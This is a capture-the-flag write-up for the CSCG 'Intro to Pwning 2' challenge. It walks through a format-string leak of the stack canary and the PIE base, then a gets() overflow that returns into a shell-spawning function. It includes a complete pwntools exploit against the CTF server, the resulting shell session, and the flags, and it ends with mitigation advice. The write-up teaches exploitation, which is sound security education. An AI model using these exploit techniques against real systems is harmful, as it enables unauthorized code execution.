# Intro to Pwning 2

**Author**: `Managarmr`

## Table of Contents

1. [Challenge](#1-challenge)
2. [Having a look](#2-having-a-look)
3. [Exploiting](#3-exploiting)
4. [Final exploit](#4-final-exploit)
5. [Mitigations](#5-mitigations)


## 1. Challenge

**Category**: `Pwn`  
**Difficulty**: `Baby`  
**Author**: `LiveOverflow`  
**Attachments**: [intro_pwn.zip](https://static.allesctf.net/challenges/8176578445cfc3b1f615f0683bc9173e9e2f53f5adf953c12bccf42280dacda9/intro_pwn.zip)  
**Description**:

This is a introductory challenge for exploiting Linux binaries with memory corruptions. Nowodays there are quite a few mitigations that make it not as straight forward as it used to be. So in order to introduce players to pwnable challenges, [LiveOverflow created a video walkthrough](https://www.youtube.com/watch?v=hhu7vhmuISY) of the first challenge. [An alternative writeup](https://static.allesctf.net/Tutorial_Intro_Pwn.html) can also be found by 0x4d5a. More resources can also be found [here](https://github.com/LiveOverflow/pwn_docker_example).

## 2. Having a look

### 2.1 Overview

Looking at the zip file we can see that the files for all 3 challenges have
been provided:

```
$ unzip -l intro_pwn.zip 
Archive:  intro_pwn.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-02-17 04:07   pwn3/
       23  2020-02-17 04:07   pwn3/flag
    13296  2020-02-17 04:07   pwn3/pwn3
      332  2020-02-17 04:07   pwn3/Dockerfile
    18744  2020-02-17 04:07   pwn3/ynetd
     2452  2020-02-26 21:27   pwn3/pwn3.c
        0  2020-02-17 04:07   pwn2/
       23  2020-02-17 04:07   pwn2/flag
    13336  2020-02-17 04:07   pwn2/pwn2
      332  2020-02-17 04:07   pwn2/Dockerfile
     2487  2020-02-27 22:04   pwn2/pwn2.c
    18744  2020-02-17 04:07   pwn2/ynetd
      311  2020-02-17 04:07   Makefile
        0  2020-02-17 04:07   pwn1/
     1745  2020-02-25 19:44   pwn1/pwn1.c
       23  2020-02-17 04:07   pwn1/flag
      333  2020-02-17 04:07   pwn1/Dockerfile
    18744  2020-02-17 04:07   pwn1/ynetd
    13120  2020-02-17 04:07   pwn1/pwn1
      610  2020-02-17 04:07   docker-compose.yml
---------                     -------
   104655                     20 files
```

However we are only interested in the `pwn2` directory for now.

### 2.2 Source code

Lucky for us we are provided with the source code - upon checking it out we
immediately spot a nice function:

```c
void WINgardium_leviosa() {
    printf("┌───────────────────────┐\n");
    printf("│ You are a Slytherin.. │\n");
    printf("└───────────────────────┘\n");
    system("/bin/sh");
}
```

This must be our target function as calling it will drop us into a shell -
fair enough for a baby challenge. Unfortunately the function is never called
regularly, meaning we have to do it ourselves. Checking the `main()` function
we can see that the `check_password_stage1()` and `welcome()` functions are
called beforehand:

```c
void main(int argc, char* argv[]) {
    ignore_me_init_buffering();
    ignore_me_init_signal();

    check_password_stage1();

    welcome();
    AAAAAAAA();
}
```

```c
void check_password_stage1() {
    char read_buf[0xff];
    printf("Enter the password of stage 1:\n");
    memset(read_buf, 0, sizeof(read_buf));
    read_input(0, read_buf, sizeof(read_buf));
    if(strcmp(read_buf, PASSWORD) != 0) {
        printf("-10 Points for Ravenclaw!\n");
        _exit(0);
    } else {
        printf("+10 Points for Ravenclaw!\n");
    }
}
```

```c
void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n");
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Ravenclaw!  │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}
```

The `check_password_stage1()` function seems to be safe, but we can spot two
issues within the `welcome()` function:
1. The `gets()` call allows us to overflow the stack buffer and possible gain
code redirection.
2. The `printf()` call is given our user-provided input as format string,
allowing us to possibly leak or clobber data.

The last function `AAAAAAAA()` doesn't look much better:

```c
void AAAAAAAA() {
    char read_buf[0xff];
    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Ravenclaw!\n");
        _exit(0);
    }
}
```

And also allows us to smash the stack for fun and profit. This function also
has a caveat though, namely that  we **must** pass the `strcmp()` as we cannot
afford the call to `_exit()` as this would terminate the program without ever
using our overwritten stack values.

## 3. Exploiting

### 3.1 Checking out the binary

Looking at the binary with checksec we can see that all security features are
enabled:

```
[*] '/home/managarmr/CTF/2020/CSCG/Pwn/Intro_To_Pwning/pwn2/pwn2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Meaning we have to somehow bypass `ASLR` and `stack canaries` if we want to
return into the `WINgardium_leviosa()` function.

### 3.2 Bypassing ASLR

Remember the rogue `printf()`? We can use this to defeat `ASLR` by leaking an
address:

```python
target.sendline('%p ' * 50)
leak = target.recvline_contains('spell:').split(b' ')
for i in range(0, 50):
	log.info(f'{i + 1}: {leak[i]}')
```

Which returns the following output:

```
[...snip...]
[*] 38: b'(nil)'
[*] 39: b'0xe2e2c9f78238ba00'
[*] 40: b'0x7ffc6961d070'
[*] 41: b'0x5643c8c8cdc5'
[*] 42: b'0x7ffc6961d158'
[...snip...]
```

The address in slot `41` is the return address of the `welcome()` call.
This means we can get the base address by subtracting `0xdc5`:

```
0000000000000d8e <main>:
 d8e:   55                      push   %rbp
 d8f:   48 89 e5                mov    %rsp,%rbp
 d92:   48 83 ec 10             sub    $0x10,%rsp
 d96:   89 7d fc                mov    %edi,-0x4(%rbp)
 d99:   48 89 75 f0             mov    %rsi,-0x10(%rbp)
 d9d:   b8 00 00 00 00          mov    $0x0,%eax
 da2:   e8 93 fc ff ff          callq  a3a <ignore_me_init_buffering>
 da7:   b8 00 00 00 00          mov    $0x0,%eax
 dac:   e8 19 fd ff ff          callq  aca <ignore_me_init_signal>
 db1:   b8 00 00 00 00          mov    $0x0,%eax
 db6:   e8 10 fe ff ff          callq  bcb <check_password_stage1>
 dbb:   b8 00 00 00 00          mov    $0x0,%eax
 dc0:   e8 b1 fe ff ff          callq  c76 <welcome>
 dc5:   b8 00 00 00 00          mov    $0x0,%eax
 dca:   e8 30 ff ff ff          callq  cff <AAAAAAAA>
 dcf:   90                      nop
 dd0:   c9                      leaveq 
 dd1:   c3                      retq   
 dd2:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
 dd9:   00 00 00 
 ddc:   0f 1f 40 00             nopl   0x0(%rax)
```

### 3.3 Bypassing the stack canary

As we are able to leak the whole stack bypassing the `canary` becomes trivial.
We know the return address is at offset `41`, meaning the `canary` must be at
offset `39` as the `%rbp` register is saved between them. Now we can just
replay it and there will be no problem with our exploit. We can also confirm
this to be the `canary` as the lower byte is `\0`, which is always the case for
the `stack canary`.

### 3.4 Executing /bin/sh

After bypassing `ASLR` and the `stack canary` executing `/bin/sh` becomes
trivial, as we just need to return to the `WINgardium_leviosa()` function. In
order to do so we still have to pass the `strcmp()`, but lucky for us `gets()`
does not care about null-bytes, whereas `strcmp()` only compares strings until
a null-byte is encountered. Thus we simply have to prepend out exploit with
`Expelliarmus\0`.

The next step is to determine which offset we need to use for our `ROP`-address,
lucky for us pwntools `cyclic()` function and `GDB` make this trivial as well.

After a trial run `GDB` tells us the magic value for `cyclic()` is `cnaa`:

![Overflow offset](pwn1_1.png)  
(This image is from `pwn1`, the offset is the same though)

Running this within the supplied `docker` environment crashes though, because
an unaligned `movaps xmm` instruction is executed. In order to fix it we just
have to realign the stack by returning to a `ret` instruction first.

## 4. Final exploit

With all the information mentioned above we can finally develop our exploit:

```python
#!/usr/bin/env python3
from pwn import *

# THIS_IS_TEST_FLAG | NOW_PRACTICE_MORE
PASSWORD = 'CSCG{NOW_PRACTICE_MORE}' # Set to flag from stage 1

LEAK_BASE_OFFSET = 0xdc5
TARGET_OFFSET = 0xb94
RET_OFFSET = 0xdd1

# target = process('./pwn2/pwn2')
target = remote('hax1.allesctf.net', 9101)

target.sendline(PASSWORD)

# Canary + Return of welcome()
target.sendline('%39$p %41$p')
leaked = target.recvline_contains('magic spell:')
canary = int(leaked.split(b' ')[0][2:], 16)
base = int(leaked.split(b' ')[1][2:], 16) - LEAK_BASE_OFFSET

log.info(f'Leaked canary: {hex(canary)}')
log.info(f'Leaked base address: {hex(base)}')
log.info(f'Target address: {hex(base + TARGET_OFFSET)}')

target.sendline(b'Expelliarmus\0' +
	b'x' * (cyclic_find(b'cnaa')) +
	p64(canary) + b'x' * 8 +
	p64(base + RET_OFFSET) + p64(base + TARGET_OFFSET))

target.interactive()
```

Running the exploit drops us into a shell:

```
$ ./solve_2.py
[+] Opening connection to hax1.allesctf.net on port 9101: Done
[*] Leaked canary: 0xcab9780192e7a400
[*] Leaked base address: 0x55df8f118000
[*] Target address: 0x55df8f118b94
[*] Switching to interactive mode
~ Protego!
┌───────────────────────┐
│ You are a Slytherin.. │
└───────────────────────┘
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag
pwn2
ynetd
$ cat flag
CSCG{NOW_GET_VOLDEMORT}$
```

The flag for this challenge was `CSCG{NOW_GET_VOLDEMORT}`.

## 5. Mitigations

There are two possible mitigations:

- Do **not** use `gets()`, rather use a safe function such as `read()`,
`fgets()`, etc.
- Do **not** pass user-supplied data as format argument to `printf()`, rather
pass it to `puts()` or use a format string of `%s`.
